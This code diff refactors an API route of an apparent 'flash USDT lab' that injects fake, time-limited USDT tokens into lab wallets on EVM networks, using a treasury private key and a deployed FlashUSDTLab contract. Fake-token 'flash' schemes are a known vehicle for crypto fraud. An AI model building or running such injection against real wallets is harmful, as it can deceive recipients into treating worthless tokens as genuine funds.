@@ -13,7 +13,8 @@ import {
   isLabEvmReady,
 } from "@/lib/evm/flash-usdt-lab";
 import { getOfficialUsdtContractAddress } from "@/lib/evm/usdt-canonical";
-import { resolveLabContractAddress, isTreasuryConfigured } from "@/lib/evm/contract-registry";
+import { resolveEvmLabContext } from "@/lib/evm/lab-context";
+import { isTreasuryReady } from "@/lib/evm/treasury-registry";
 import { parseEvmNetwork, type EvmNetwork } from "@/lib/evm/network";
 import type { LabInjectionMode } from "@/lib/labs/types";
 
@@ -64,9 +65,10 @@ export async function POST(req: Request) {
   const injectionMode = (session.injection_mode ?? "fake_token") as LabInjectionMode;
   const flashDurationMinutes = Number(session.flash_duration_minutes ?? 30);
   const network = (parseEvmNetwork(session.network) ?? "bsc") as EvmNetwork;
-  const labContractAddress = await resolveLabContractAddress(admin, network);
+  const { labContractAddress, evmOptions } = await resolveEvmLabContext(admin, network);
+  const treasuryReady = await isTreasuryReady(admin);
 
-  if (isTreasuryConfigured(network) && !labContractAddress) {
+  if (treasuryReady && !labContractAddress) {
     return NextResponse.json(
       {
         error: `Red ${network} sin contrato. Despliega FlashUSDTLab desde Infra EVM en el backoffice.`,
@@ -74,8 +76,6 @@ export async function POST(req: Request) {
       { status: 503 }
     );
   }
-
-  const evmOptions = labContractAddress ? { labContractAddress } : undefined;
 
   let walletsQuery = supabase
     .from("lab_wallets")
@@ -215,7 +215,7 @@ export async function POST(req: Request) {
       walletsProcessed: results.length,
       injectionMode,
       flashDurationMinutes,
-      evmReady: isLabEvmReady(network, labContractAddress),
+      evmReady: isLabEvmReady(network, labContractAddress, evmOptions.treasuryPrivateKey),
       network,
     },
     ip_address: getClientIp(req),
@@ -226,7 +226,7 @@ export async function POST(req: Request) {
     injectionMode,
     flashDurationMinutes,
     expiresAt,
-    evmConfigured: isLabEvmReady(network, labContractAddress),
+    evmConfigured: isLabEvmReady(network, labContractAddress, evmOptions.treasuryPrivateKey),
     network,
     results,
   });
